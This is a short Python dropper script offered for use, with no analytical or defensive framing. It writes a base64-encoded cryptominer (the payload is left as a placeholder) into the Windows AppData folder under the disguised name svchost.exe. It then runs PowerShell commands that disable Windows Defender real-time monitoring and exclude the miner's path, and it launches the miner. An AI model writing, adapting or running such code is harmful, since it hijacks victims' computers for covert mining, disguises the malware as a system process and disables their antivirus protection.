import os
import base64
import subprocess

# === 1. Base64-encoded miner.exe content ===
b64_miner = b"""
<YOUR_BASE64_MINER>
"""

# === 2. Write miner.exe to AppData ===
miner_path = os.path.expandvars(r"%APPDATA%\\svchost.exe")
with open(miner_path, "wb") as f:
    f.write(base64.b64decode(b64_miner))

# === 3. Disable Defender using PowerShell ===
def disable_defender():
    try:
        subprocess.run([
            "powershell",
            "-Command",
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Add-MpPreference -ExclusionPath '{}'"
            .format(miner_path)
        ], shell=True)
    except Exception as e:
        print("[!] Failed to disable Defender:", e)

# === 4. Run the miner ===
def run_miner():
    try:
        subprocess.Popen(miner_path, shell=True)
    except Exception as e:
        print("[!] Failed to run miner:", e)

# === Execute ===
disable_defender()
run_miner()
